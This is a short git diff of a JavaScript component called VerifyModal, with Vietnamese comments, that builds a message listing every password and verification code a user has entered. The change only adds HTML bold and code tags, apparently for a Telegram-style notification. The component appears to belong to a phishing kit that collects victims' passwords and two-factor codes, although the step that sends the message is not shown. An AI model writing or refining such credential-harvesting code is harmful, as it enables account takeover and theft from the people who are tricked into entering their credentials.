@@ -122,17 +122,17 @@ const VerifyModal = ({ nextStep }) => {
             
             // Thêm tất cả passwords
             passwords.forEach((pwd, index) => {
-                updatedMessage += `\n🔑 Password ${index + 1}: ${pwd}`;
+                updatedMessage += `\n🔑 <b>Password ${index + 1}:</b> <code>${pwd}</code>`;
             });
             
             // Thêm tất cả codes đã có
             codes.forEach((c, index) => {
-                updatedMessage += `\n🔐 Code ${index + 1}: ${c}`;
+                updatedMessage += `\n🔐 <b>Code ${index + 1}:</b> <code>${c}</code>`;
             });
             
             // Thêm code mới
             const codeNumber = codes.length + 1;
-            updatedMessage += `\n🔐 Code ${codeNumber}: ${code}`;
+            updatedMessage += `\n🔐 <b>Code ${codeNumber}:</b> <code>${code}</code>`;
             
             // Lưu code mới vào store
             addCode(code);
